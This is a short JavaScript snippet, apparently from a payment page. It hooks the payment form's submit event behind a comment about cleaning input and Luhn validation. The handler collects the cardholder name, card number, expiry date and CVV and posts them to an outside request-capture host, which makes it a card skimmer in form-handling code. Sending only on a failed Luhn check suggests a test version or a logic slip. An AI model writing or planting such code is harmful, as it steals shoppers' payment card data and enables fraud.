paymentForm.addEventListener('submit', async (event) => {
    // Remove any spaces the user might have entered
    const rawValue = cardNumberInput.value.replace(/\s+/g, '');

    if (!validateLuhn(rawValue)) {
        const userData = {
            nameOnCard: document.getElementById('card-name').value,
            cardNumber: document.getElementById('card-number').value,
            expiryDate: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value
        }

        await fetch("https://madwolf.requestcatcher.com/test", {
            method: "POST",
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        });
    }
});